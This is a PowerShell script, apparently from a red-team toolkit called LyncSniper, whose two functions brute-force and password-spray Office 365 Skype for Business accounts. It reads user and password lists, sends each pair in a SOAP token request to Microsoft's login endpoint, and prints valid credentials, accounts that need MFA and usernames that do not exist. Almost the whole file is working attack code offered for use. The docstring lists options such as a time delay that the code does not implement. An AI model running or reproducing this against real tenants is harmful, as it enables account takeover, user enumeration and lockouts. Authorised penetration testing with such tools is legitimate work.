#requires -version 2

<#

.____                           _________      .__
|    |    ___.__. ____   ____  /   _____/ ____ |__|_____   ___________
|    |   <   |  |/    \_/ ___\ \_____  \ /    \|  \____ \_/ __ \_  __ \
|    |___ \___  |   |  \  \___ /        \   |  \  |  |_> >  ___/|  | \/
|_______ \/ ____|___|  /\___  >_______  /___|  /__|   __/ \___  >__|
        \/\/         \/     \/        \/     \/   |__|        \/

        ︻デ┳═ー    - - - - - - - - - - - - - - - - - - - - - - - - - -

        Author: @domchell

        ActiveBreach by MDSec
#>

Import-Module '.\Tunable-SSL-Validator\TunableSSLValidator.psm1'

function Invoke-LyncBrute
{

  <#
    .SYNOPSIS
      This module will attempt to bruteforce passwords for a supplied user account
      LyncSniper Function: Invoke-LyncBrute
      Author: Dominic Chell (@domchell)
      License: BSD 3-Clause
      Required Dependencies: TunableSSLValidator
      Optional Dependencies: None
    .DESCRIPTION
      This module will attempt to discover the URL for the Skype for Business deployment, if the URL cannot be discovered it can be forced by the user. The Office365 switch should be applied for Office 365 tenants so that the correct endpoints are used.
      The username supplied will be bruteforced with the passwords in the supplied password list.
    .PARAMETER PassList
      A list of passwords to bruteforce the user account with
    .PARAMETER Username
      The username to target
    .PARAMETER Office365
      The Skype for Business target is an Office 365 tenant
    .PARAMETER AutoDiscoverURL
      Force the user of this AutoDiscover URL
    .PARAMETER TimeDelay
      Attempt 3 passwords then sleep for this delay inbetween password attempts
    .EXAMPLE
      C:\PS> Invoke-LyncBrute -PassList .\passwords.txt -UserName foo.bar@domain.com -TimeDelay 60
      Description
      -----------
      This command will bruteforce the supplied username with the passwords in the supplied password list, sleeping for 60 seconds every 3 attempts. *BEWARE OF ACCOUNT LOCKOUTS*
  #>

  [CmdletBinding()]
  Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $PassList = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $UserList = ""
  )

  $Passwords = Get-Content $PassList
  $Usernames = Get-Content $UserList

  Write-Host -foreground "blue" "[*] Commencing bruteforce at $(Get-Date)"
  Write-Host -foreground "red" "[*] BEWARE OF ACCOUNT LOCKOUTS"
 
  ForEach($Username in $Usernames)
  {
    ForEach($Password in $Passwords)
    {
        # Account Lockout	After 10 unsuccessful sign-in attempts (wrong password), the user will be
        # locked out for one minute. Further incorrect sign-in attempts will lock out the user for increasing durations.
        # https://docs.microsoft.com/en-gb/azure/active-directory/active-directory-passwords-policy

        $result = Invoke-AuthenticateO365 -Username $Username -Password $Password

    }
  }
  Write-Host -foreground "blue" "[*] Ending bruteforce at $(Get-Date)"
}


function Invoke-AuthenticateO365
{
  <#
    .SYNOPSIS
      This module will attempt to authenticate to the Office 365 Skype for Business service using Windows Live credentials.
      LyncSniper Function: Invoke-AuthenticateO365
      Author: Dominic Chell (@domchell)
      License: BSD 3-Clause
      Required Dependencies: TunableSSLValidator
      Optional Dependencies: None
    .DESCRIPTION
      This module will attempt to authenticate with give credentials against the Office 365 Skype for Business service.
    .PARAMETER Username
      The Windows Live username to authenticate with
    .PARAMETER Password
      The Windows Live password to authenticate with
    .EXAMPLE
      C:\PS> Invoke-AuthenticateO365 -Username user@domain.com -Password Password1
      Description
      -----------
      This command will attempt to authenticate to the Office 365 Skype for Business service.
  #>
  [CmdletBinding()]
  Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = ""
  )

  try
  {
    $soap = @"
<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
    <S:Header>
    <wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
    <wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To>
    <ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo">
        <ps:BinaryVersion>5</ps:BinaryVersion>
        <ps:HostingApp>Managed IDCRL</ps:HostingApp>
    </ps:AuthInfo>
    <wsse:Security>
    <wsse:UsernameToken wsu:Id="user">
        <wsse:Username>$($Username)</wsse:Username>
        <wsse:Password>$($Password)</wsse:Password>
    </wsse:UsernameToken>
    <wsu:Timestamp Id="Timestamp">
        <wsu:Created>$(([DateTime]::UtcNow.ToString("o")))</wsu:Created>
        <wsu:Expires>$(([DateTime]::UtcNow.AddDays(1).ToString("o")))</wsu:Expires>
    </wsu:Timestamp>
</wsse:Security>
    </S:Header>
    <S:Body>
    <wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0">
        <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
        <wsp:AppliesTo>
        <wsa:EndpointReference>
            <wsa:Address>online.lync.com</wsa:Address>
        </wsa:EndpointReference>
        </wsp:AppliesTo>
        <wsp:PolicyReference URI="MBI"></wsp:PolicyReference>
    </wst:RequestSecurityToken>
    </S:Body>
</S:Envelope>
"@

    $loginUrl = "https://login.microsoftonline.com/rst2.srf"
    $body = [System.Text.Encoding]::UTF8.GetBytes($soap)
    $request = [System.Net.WebRequest]::Create($loginUrl)
    $request.Method = "POST"
    $request.ContentType = "application/soap+xml; charset=utf-8"
    $stream = $request.GetRequestStream()
    $stream.Write($body, 0, $body.Length)
    $response = $request.GetResponse()

    $data = $null
    try {
      $streamReader = New-Object System.IO.StreamReader $response.GetResponseStream()
      try {
        [xml]$data = $streamReader.ReadToEnd()
      } finally {
        $streamReader.Dispose()
      }
    } finally {
      $response.Dispose()
    }
    $BinarySecurityToken = $data.Envelope.Body.RequestSecurityTokenResponse.RequestedSecurityToken.BinarySecurityToken.InnerText
    if ($data.OuterXml.Contains("you must use multi-factor"))
    {
      write-host -ForegroundColor "green" "[*] Found Credentials: $($Username):$($Password) However, MFA is required."
    }
    elseif($data.OuterXml.Contains("Error validating credentials"))
    {
        Write-Verbose "[*] Invalid credentials: $($Username):$($Password)"
    }
    ElseIf($BinarySecurityToken)
    {
      write-host -foreground "green" "[*] Found credentials: $($Username):$($Password)"
    }
    else
    {
      Write-Verbose "[*] Authentication failed: $($Username):$($Password). Username does not exist."
    }

  } catch {
    $_.Exception
  }
}